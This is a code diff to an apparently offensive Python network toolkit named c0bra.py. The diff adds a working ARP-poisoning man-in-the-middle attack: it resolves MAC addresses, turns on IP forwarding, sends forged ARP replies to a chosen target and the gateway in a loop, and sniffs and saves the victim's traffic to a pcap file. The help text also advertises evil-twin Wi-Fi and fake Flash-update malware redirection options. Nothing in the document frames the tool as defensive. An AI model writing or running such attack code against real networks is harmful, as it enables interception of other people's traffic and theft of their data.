@@ -1,8 +1,10 @@
 #!/usr/bin/python
 
 from colored import fg, attr
+from scapy.all import *
 import netifaces
 import getpass
+import time
 import nmap
 import sys
 
@@ -20,27 +22,35 @@ RED_ICON      = "%s[!]%s" % (fg(1)  , attr(0))
 GATEWAY       = netifaces.gateways()["default"][netifaces.AF_INET][0]
 NM            = nmap.PortScanner()
 
-def arp_poisoning(target, plugin):
-	
+def get_mac(ip_address):
+	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_address), timeout = 2,
+	retry = 10, verbose = False)
+
+	for s, r in responses:
+		return r[Ether].src
+		
+		
+def arp_poisoning(target, target_mac, gateway_mac, plugin, interface):
 	#PLUGIN CHECK
 	if plugin == "-n":
 		plugin = "NONE"
 		
 	elif plugin == "-w":
 		plugin =  "VISITED SITES SNIFFER"
-		
+	
 	elif plugin == "-p":
-		plugin = "PICTURES SNIFFER"
-		
+		plugin = "PICTURES SNIFFER"	
+	
 	else:
 		print("%s ERROR : PLUGIN '%s' NOT FOUND") % (RED_ICON, plugin)
 		sys.exit(1)
+	
 		
 		
 	#CHECK IF TARGET IS UP
 	try:
 		NM.scan(hosts = target, arguments = "-sP")
-		
+			
 		if NM[target].state() == "up":
 			pass
 	except KeyError:
@@ -48,11 +58,50 @@ def arp_poisoning(target, plugin):
 		sys.exit(1)
 	
 	
-	print("%s GATEWAY : %s") % (BLUE_ICON, GATEWAY)
-	print("%s TARGET  : %s") % (BLUE_ICON, target)
-	print("%s PLUGIN  : %s") % (BLUE_ICON, plugin)
 	
+	#IP FORWARD
+	f = open("/proc/sys/net/ipv4/ip_forward", "w")
+	f.write("1")
+	f.close()
 	
+	print("%s GATEWAY : %s\t| MAC : %s") % (BLUE_ICON, GATEWAY, gateway_mac)
+	print("%s TARGET  : %s\t| MAC : %s") % (BLUE_ICON, target, target_mac)
+	print("%s PLUGIN  : %s")             % (BLUE_ICON, plugin)
+	
+	poison_target       = ARP()
+	poison_target.op    = 2
+	poison_target.psrc  = GATEWAY
+	poison_target.pdst  = target
+	poison_target.hwdst = target_mac
+	
+	poison_gateway       = ARP()
+	poison_gateway.op     = 2
+	poison_gateway.psrc  = target
+	poison_gateway.pdst  = GATEWAY
+	poison_gateway.hwdst = gateway_mac
+	
+	print("%s ATTACK STARTED, FOR STOP TYPE 'CTRL + C'") % GREEN_ICON
+	while 1:
+		try:
+			send(poison_target,  verbose = False)
+			send(poison_gateway, verbose = False)
+			
+			cbr_filter = "ip host %s" % target
+			packets    = sniff(count = 1000, filter = cbr_filter, iface = interface)
+			
+			if plugin == "NONE":
+				wrpcap("arp_poisoning.pcap", packets)
+			
+			time.sleep(2)			
+		except KeyboardInterrupt:
+			print("\n%s EXIT") % RED_ICON
+			
+			f = open("/proc/sys/net/ipv4/ip_forward", "w")
+			f.write("0")
+			f.close()
+						
+			sys.exit()
+
 def check_root():
 	username = getpass.getuser()
 	
@@ -72,16 +121,16 @@ def live_hosts():
 		
 	NM.scan(hosts = all_network, arguments = "-sP")
 	for host in NM.all_hosts():
-		print("\t%s %s \t%s") % (GREEN_ICON, host, nm[host].hostname())
+		print("\t%s %s \t%s") % (GREEN_ICON, host, NM[host].hostname())
 
 
 def help():
 	print("""
 %s ARGUMENTS:
-1) --live-hosts                           = scan network for live hosts
-2) --arp-poisoning <TARGET> <PLUGIN>      = arp poisoning attack
-3) --evil-twin <NETWORK_SSID> <INTERFACE> = evil twin attack
-4) --rediect-flash <target> <maleware>    = rediect to fake flash update page 
+1) --live-hosts                                  = scan network for live hosts
+2) --arp-poisoning <TARGET> <PLUGIN> <INTERFACE> = arp poisoning attack
+3) --evil-twin <NETWORK_SSID> <INTERFACE>        = evil twin attack
+4) --rediect-flash <target> <maleware>           = rediect to fake flash update page 
 
 \t%s ARP POISONING ARGUMENTS:
 \t -n = none
@@ -100,12 +149,15 @@ def check_arguments():
 		
 	elif sys.argv[1] == "--arp-poisoning":
 		try:
-			target = sys.argv[2]
-			plugin = sys.argv[3]
+			target      = sys.argv[2]
+			plugin      = sys.argv[3]
+			interface   = sys.argv[4]
+			target_mac  = get_mac(target)
+			gateway_mac = get_mac(GATEWAY)
 			
-			arp_poisoning(target, plugin)
+			arp_poisoning(target, target_mac, gateway_mac, plugin, interface)
 		except IndexError:
-			print("%s USAGE : ./c0bra.py <TARGET> <PLUGIN>") % RED_ICON
+			print("%s USAGE : ./c0bra.py <TARGET> <PLUGIN> <INTERFACE>") % RED_ICON
 
 	elif sys.argv[1] == "--help":
 		help()
